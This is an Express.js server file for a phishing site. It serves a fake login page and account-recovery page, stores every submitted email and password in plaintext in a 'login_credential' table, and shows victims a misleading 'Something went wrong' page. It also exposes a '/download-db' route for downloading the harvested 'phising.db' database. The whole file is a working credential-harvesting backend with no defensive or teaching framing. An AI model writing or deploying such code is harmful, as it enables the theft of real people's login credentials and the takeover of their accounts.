const express = require("express");
const app = express();
const bodyParser = require("body-parser");
const path = require("path");

const PORT = process.env.PORT || 3000;
// const downloadLink = require("./routes/download");

//Importing the database into the server
const db = require("./databaseSetup");

//serving static files
app.use(express.static("public"));
app.use(express.json());
// app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// importing the dotenv file
require("dotenv").config();

//middlewire for the ejs app
app.set("view engine", "ejs");

app.get("/", (req, res) => {
  res.render("login-page");
});

app.get("/recover-account", (req, res) => {
  res.render("recover");
});

app.post("/", (req, res) => {
  const { email, password } = req.body;

  try {
    //checking if the email exists in the database
    db.get(
      "SELECT * FROM login_credential WHERE email=?",
      [email],
      function (err, result) {
        if (err) return console.log(err.message);

        if (email === "" || password === "")
          return res.render("login-page", {
            error: "The email or mobile number fields can't be empty",
          });

        // Checking if the email data is found
        if (result) {
          console.log(result);

          return res.render("error", {
            success: "Something went wrong",
          });
        } else {
          // create the user and insert their result in the database
          db.run(
            `INSERT INTO login_credential (email, password)
            VALUES(?, ?)`,
            [email, password],
            (err, result) => {
              if (err) return err.message;

              res.render("error", {
                success: "Something went wrong",
              });
              console.log("User has successfully been created.");
            }
          );
        }
      }
    );
  } catch (error) {
    console.error("error");
    res.render("login-page", { error: "An error occur" });
  }
});

// Download route to local mechine
app.get("/download-db", (req, res) => {
  const filePath = path.join(__dirname, "/phising.db");
  console.log(__dirname);

  res.download(filePath, "phising.db", (err) => {
    if (err)
      res.render("error", { success: "no such file or directory found" });
  });
});

app.listen(
  process.env.PORT,
  console.log(`server is listening on http://localhost:${PORT}`)
);
